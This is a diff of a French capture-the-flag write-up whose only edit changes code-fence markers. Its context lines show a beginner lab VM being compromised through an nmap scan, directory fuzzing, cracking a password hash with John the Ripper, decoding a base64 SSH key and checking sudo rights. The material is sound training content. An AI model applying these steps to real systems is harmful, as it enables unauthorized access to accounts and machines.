@@ -16,7 +16,7 @@ Je qualifierais le niveau du CTF de *grand débutant*, la description est d'aill
 
 On commence par le scan de ports classique mais avec les instructions que l'on va croiser on aurait tout simplement taper l'IP de la VM dans le navigateur.  
 
-```plain
+```
 $ sudo nmap -sCV -T5 -p- 192.168.56.23 
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-07 11:35 CET 
 Nmap scan report for 192.168.56.23 
@@ -50,7 +50,7 @@ Dans les pages existantes on trouve un article sur l'utilisation de fuzzers de s
 
 En toute logique je lance *feroxbuster* sur le site :  
 
-```plain
+```
 $ feroxbuster -u http://192.168.56.23/ -w /tools/fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-directories.txt -n
 
  ___  ___  __   __     __      __         __   ___
@@ -92,7 +92,7 @@ Je ne suis pas un expert *DokuWiki* donc aucune URL ne me paraissait particuliè
 
 Je ne met pas l'ensemble du texte trouvé mais voici le principal :  
 
-```plain
+```
 --------------------------------------------------- 
 
 Before I forget, I've created the following user: 
@@ -115,7 +115,7 @@ When prompted, enter the password and read the README file.
 
 Le texte proposait d'utilisait hashcat mais ça marche bien sûr tout aussi bien avec John The Ripper pour un mot de passe aussi faible :  
 
-```plain
+```
 $ john --wordlist=/tools/wordlists/rockyou.txt /tmp/hash.txt
 Using default input encoding: UTF-8
 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
@@ -130,7 +130,7 @@ Session completed.
 
 On trouve une fois connecté un fichier encodé en base64 :  
 
-```plain
+```
 cypher@easy-vm:~$ cat base64what | base64 -d 
 neo:$6$hgNhPDuhnI2CLzVy$4PYhoCGT24G5DhJT3OCG/7CxXXZ15gLtoSqwt4h5HAATzq4QjXDbrkmzymm/2otJmwFTl9N8ruDQiC2BQKQiy/:18991:0:99999:7::: 
 
@@ -148,7 +148,7 @@ chmod FTW
 
 Un nouveau README à cette étape, là encore ça s'adresse plus aux débutants Linux :  
 
-```plain
+```
 Welcome to the real world, Neo. 
 
 In the home directory, there's a file:  trinity-key 
@@ -167,7 +167,7 @@ When we look at the directory, isolating the two files, we see:
 
 Ce fichier, une fois les permissions corrigées, contient une clé privée SSH encodée en base64.  
 
-```plain
+```
 neo@easy-vm:~$ chmod 600 trinity-key
 neo@easy-vm:~$ base64 -d trinity-key > id_rsa 
 neo@easy-vm:~$ chmod 600 id_rsa  
@@ -203,7 +203,7 @@ uid=1001(trinity) gid=1001(trinity) groups=1001(trinity)
 
 Finalement on en vient à l'indice du début :  
 
-```plain
+```
 trinity@easy-vm:~$ sudo -l 
 Matching Defaults entries for trinity on easy-vm: 
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin 
